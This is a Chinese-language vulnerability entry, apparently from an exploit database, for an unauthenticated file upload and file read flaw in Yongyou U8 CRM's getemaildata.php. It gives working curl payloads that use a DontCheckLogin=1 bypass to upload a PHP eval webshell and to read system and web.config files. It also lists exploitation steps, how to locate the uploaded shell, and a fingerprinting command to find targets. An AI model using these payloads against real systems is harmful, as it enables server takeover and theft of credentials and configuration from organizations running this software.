---
id: YONGYOU-U8-CRM-RCE
title: 用友 U8 CRM getemaildata.php 任意文件上传/读取漏洞
product: yongyou
vendor: 用友网络
version_affected: "用友 U8 CRM all versions"
severity: CRITICAL
tags: [file_upload, file_read, rce, 无需认证, 国产, oa]
fingerprint: ["用友U8CRM", "U8 CRM"]
---

## 漏洞描述

用友 U8 CRM 客户关系管理系统的 getemaildata.php 文件同时存在任意文件上传和任意文件读取漏洞。通过 `DontCheckLogin=1` 参数可绕过认证检查，攻击者可上传 PHP webshell 获取服务器权限，或读取系统敏感文件。

## 影响版本

- 用友 U8 CRM 客户关系管理系统（所有已知版本）

## 前置条件

- 无需认证（`DontCheckLogin=1` 绕过）
- 目标运行用友 U8 CRM

## 利用步骤

1. 确认目标为用友 U8 CRM
2. 利用 `DontCheckLogin=1` 绕过认证
3. 上传 PHP webshell 或读取敏感文件
4. 访问上传的 webshell 执行命令

## Payload

**任意文件上传**

```bash
curl -s "http://target/ajax/getemaildata.php?DontCheckLogin=1" \
  -X POST \
  -H "Content-Type: multipart/form-data; boundary=----Boundary" \
  -d '------Boundary
Content-Disposition: form-data; name="file"; filename="test.php "
Content-Type: text/plain

<?php echo "VULN_TEST"; @eval($_POST["cmd"]); ?>
------Boundary--'
```

上传后文件保存在 `/tmpfile/` 目录，文件名格式为 `updXXXX.tmp.php`（十六进制递增）。

**任意文件读取**

```bash
# 读取 Windows 系统文件
curl -s "http://target/ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini"

# 读取 Web 配置
curl -s "http://target/ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/inetpub/wwwroot/web.config"
```

## 验证方法

```bash
# 文件读取验证
curl -s "http://target/ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini" | grep "fonts\|extensions"

# 文件上传后访问 webshell（需猜测文件名）
curl -s "http://target/tmpfile/" | grep ".php"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "用友U8CRM\|U8 CRM"
```
